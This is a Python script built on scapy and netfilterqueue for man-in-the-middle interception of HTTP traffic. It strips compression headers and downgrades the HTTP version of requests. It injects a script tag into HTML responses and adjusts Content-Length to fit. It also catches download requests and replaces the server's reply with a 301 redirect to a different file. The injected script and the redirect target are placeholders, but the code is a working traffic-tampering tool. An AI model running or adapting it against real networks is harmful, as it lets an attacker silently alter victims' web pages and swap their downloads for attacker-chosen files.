import  scapy.all as scapy
import termcolor
import  netfilterqueue
import  re
class Inj:
    ack_list = []
    @staticmethod
    def set_load(packet,load):
        packet[scapy.Raw].load =load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    @staticmethod
    def queue(process,key):
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(key,process)
        queue.run()
    @staticmethod
    def code(packet):
        scapy_packet=scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request:")
                modified_load=re.sub("Accept-Encoding:.*?\\r","",str(scapy_packet[scapy.Raw].load))
                new_packet=Inj.set_load(scapy_packet,bytes(modified_load.encode()))
                print(new_packet.show())
                packet.set_payload(bytes(new_packet))
            # elif scapy_packet[scapy.TCP].sport == 80:
            #     if scapy_packet[scapy.TCP].seq in Inj.acklist:
            #         print("[+] Response:")
            #         modified_loads=scapy_packet[scapy.Raw].load.replace("</body>","<script>alert('test');</script></body>")
            #         new_packets = Inj.set_load(scapy_packet,modified_loads)
            #         packet.set_payload(bytes(new_packets))
            #         print(packet.show())
            print(scapy_packet.show())
        packet.accept()


    @staticmethod
    def packet_modifier(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] HTTP REQUEST:")
                print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] HTTP RESPONSE:")
                print(scapy_packet.show())
    @staticmethod
    def file_interceptor(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:

                print("[+] HTTP REQUEST:")
                #file check in downloads
                if b".dat" in scapy_packet[scapy.Raw].load :
                    print("+ EXE REQUEST")
                    #add ack to the acklist
                    Inj.ack_list.append(scapy_packet[scapy.TCP].ack)
                    # print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport == 80:
                #seq in acklist as seq == ack
                if scapy_packet[scapy.TCP].seq in Inj.ack_list:
                    termcolor.cprint("[+] Replacing file","green")
                    Inj.ack_list.remove(scapy_packet[scapy.TCP].seq)
                    scapy_packet[scapy.Raw].load = b"HTTP/1.1 301 Moved Permanently\nLocation: https://unsplash.com/photos/piTEABtlR1Q/download?force=true\n\n"
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum
                    packet.set_payload(bytes(scapy_packet))
        packet.accept()
    @staticmethod
    def code_process(packet):
        scapy_packet =scapy.IP(packet.get_payload())
        if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
            load = scapy_packet[scapy.Raw].load
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                # print(type(scapy_packet[scapy.Raw].load))
                load=re.sub(b"Accept-Encoding:.+?\\r\\n",b"Accept-Encoding:\\r\\n",load)
                load = load.replace(b"HTTP/1.1",b"HTTP/1.0")
            elif scapy_packet[scapy.TCP].sport ==80:
                print("[+] Response")
                injection = b"<script>window.alert('test');</script>"
                load = load.replace(b"</body>", injection+b"</body>")
                content_length_search = re.search(b"(?:Content-Length:\s)(\d*)",load)
                if content_length_search and b"text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection)
                    # print()
                    load = load.replace(content_length,str(new_content_length).encode())
                    # print(content_length)
            if load != scapy_packet[scapy.Raw].load:
                new_packet = Inj.set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))

        packet.accept()